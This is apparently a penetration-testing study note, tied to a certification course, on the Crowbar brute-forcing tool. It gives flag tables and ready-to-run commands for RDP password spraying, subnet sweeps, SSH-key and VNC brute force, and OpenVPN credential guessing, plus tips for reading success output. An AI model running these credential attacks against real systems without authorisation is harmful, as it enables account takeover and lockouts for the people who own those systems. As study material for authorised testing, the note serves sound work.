# Crowbar

**Tags:** `#crowbar` `#bruteforce` `#auth` `#rdp` `#ssh` `#vpn` `#passwordattack`

Brute-forcing tool built for protocols that Hydra and Medusa don't handle well — primarily RDP, SSH (key-based), VNC, and OpenVPN. Particularly useful for RDP brute force since most other tools struggle with NLA (Network Level Authentication).

**Source:** https://github.com/galkan/crowbar
**Install:** `apt install crowbar` or `git clone https://github.com/galkan/crowbar`

---

## Supported Protocols

| Protocol | `-b` value | Default port | Auth material | External binary required |
|---|---|---|---|---|
| RDP | `rdp` | 3389 | username + password (`-u`/`-U`, `-c`/`-C`) | `xfreerdp` (`/usr/bin/xfreerdp`) |
| SSH | `sshkey` | 22 | private key(s) (`-k`) | none — uses `paramiko` |
| VNC | `vnckey` | 5901 | VNC passwd file (`-k`), **not** a plaintext password | `vncviewer` (`/usr/bin/vncviewer`) |
| OpenVPN | `openvpn` | 443 | username + password (`-u`/`-U`, `-c`/`-C`) + config (`-m`) | `openvpn` (`/usr/sbin/openvpn`), needs **sudo** |

> [!warning] Crowbar shells out to real client binaries (`xfreerdp`, `vncviewer`, `openvpn`) for every protocol except SSH. If the binary isn't at the hardcoded path above, crowbar errors out before attempting a single login — install `freerdp2-x11`, a VNC viewer, and `openvpn` as needed.

---

## Core Flags

| Flag | Description |
|---|---|
| `-b` | Protocol / service (`rdp`, `sshkey`, `vnckey`, `openvpn`) — **required** |
| `-s` | Static target — IP or CIDR (`192.168.1.10/32` for a single host) |
| `-S` | Target list file (multiple hosts) |
| `-u` | Username(s) — accepts multiple space-separated names |
| `-U` | Username list file |
| `-c` | Single password |
| `-C` | Password list file |
| `-k` | `[SSH/VNC]` private-key / VNC-passwd file, or a directory of them |
| `-m` / `--config` | `[OpenVPN]` configuration file |
| `-p` | Target port (override the default) |
| `-n` | Number of threads (**default 5**) |
| `-t` | `[SSH]` per-thread timeout in seconds (**default 10**) — *not* thread count |
| `-d` | Discovery mode — nmap port-scan first, only attack open ports (needs `nmap`) |
| `-o` | Output file — everything (default `crowbar.out`) |
| `-l` | Log file — attempts only (default `crowbar.log`) |
| `-v` | Verbose (`-vv` prints the underlying client command) |
| `-D` | Debug mode |
| `-q` | Quiet — only display successful logins |

> [!danger] Flag gotcha — `-n` vs `-t`, `-d` vs `-D`
> These trip people up because they read backwards from hydra/most tools:
> - **`-n`** sets thread count (default 5). **`-t`** is the SSH *timeout*, not threads.
> - **`-d`** is *discovery* (port scan first). **`-D`** is *debug*.

---

## Usage

### RDP Brute Force

```bash
# Single username, single password
crowbar -b rdp -s 192.168.1.10/32 -u administrator -c 'Password123'

# Username list, single password (password spray)
crowbar -b rdp -s 192.168.1.10/32 -U users.txt -c 'Password123'

# Single username, password list
crowbar -b rdp -s 192.168.1.10/32 -u administrator -C passwords.txt

# Subnet sweep — spray across a range
crowbar -b rdp -s 192.168.1.0/24 -U users.txt -c 'Password123'

# Custom port, verbose output, save results
crowbar -b rdp -s 192.168.1.10/32 -u administrator -C passwords.txt -p 3389 -v -o results.txt
```

### SSH Key Brute Force

```bash
# Try a single key against a user
crowbar -b sshkey -s 10.10.10.10/32 -u root -k /path/to/id_rsa

# Try all keys in a directory
crowbar -b sshkey -s 10.10.10.10/32 -u root -k /path/to/keys/

# Multiple users, key directory
crowbar -b sshkey -s 10.10.10.10/32 -U users.txt -k /path/to/keys/
```

### VNC Brute Force

Crowbar's VNC module does **not** take a plaintext password. It authenticates with a VNC *passwd file* (the encrypted format VNC stores locally), passed via `-k` — exactly like the SSH key module. Generate candidate passwd files with `vncpasswd -f`.

```bash
# Build a VNC passwd file from a plaintext guess
echo 'password' | vncpasswd -f > /tmp/vnc.pass

# Try a single VNC passwd file (default port 5901)
crowbar -b vnckey -s 10.10.10.10/32 -k /tmp/vnc.pass

# Try every passwd file in a directory, non-standard port
crowbar -b vnckey -s 10.10.10.10/32 -k /tmp/vncpasswds/ -p 5900
```

### Discovery Mode (port-scan first)

```bash
# -d nmap-scans the target/range for the service port and only
# attacks hosts where it's open — useful across a wide CIDR
crowbar -b rdp -s 192.168.1.0/24 -d -U users.txt -c 'Password123'
```

### OpenVPN

```bash
# Brute force credentials against an OpenVPN endpoint.
# OpenVPN mode REQUIRES root — crowbar aborts if not run under sudo.
sudo crowbar -b openvpn -s 10.10.10.10/32 -u vpnuser -C passwords.txt -m client.ovpn
```
Default port is 443 (also seen on TCP 943 / UDP 1194 — override with `-p`). Success is detected on the `Initialization Sequence Completed` line from the openvpn client.

---

## Tips

```bash
# Crowbar is slower than Hydra by design — more reliable for RDP.
# Keep thread count low for RDP to avoid account lockouts (-n, NOT -t)
crowbar -b rdp -s 192.168.1.10/32 -U users.txt -c 'Password123' -n 1

# Successful creds are tagged <PROTO>-SUCCESS in the output file
# Format: RDP-SUCCESS : ip:port - user:password
grep SUCCESS crowbar.out
```

> [!tip] RDP "SUCCESS" variants still mean the password is valid
> Crowbar reports three RDP successes, all of which confirm correct credentials — don't discard the last two:
> - `RDP-SUCCESS :` — clean login.
> - `RDP-SUCCESS (INSUFFICIENT PRIVILEGES)` — password is right, but the account can't open an interactive RDP session (e.g. not in Remote Desktop Users).
> - `RDP-SUCCESS (ACCOUNT_LOCKED_OR_PASSWORD_EXPIRED)` — password is right, but the account is locked or the password must be changed.

> [!warning] Always check lockout policy before brute forcing RDP — even a short list can lock out accounts. Password spraying (one password across many users) is safer than per-account brute force.

> [!note] **Crowbar vs Hydra for RDP** — Hydra's RDP module is unreliable against NLA-enforced endpoints. Crowbar handles NLA correctly, making it the preferred tool for RDP brute force on modern Windows targets.


> [!note] **See also** — [[Services/Remote Access/RDP|RDP]] — crowbar handles NLA where hydra struggles (`-b rdp`). Also [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services|Attacking Common Services]] (CPTS v2).

---

*Created: 2026-03-06*
*Updated: 2026-09-28*
*Model: claude-opus-4-8*
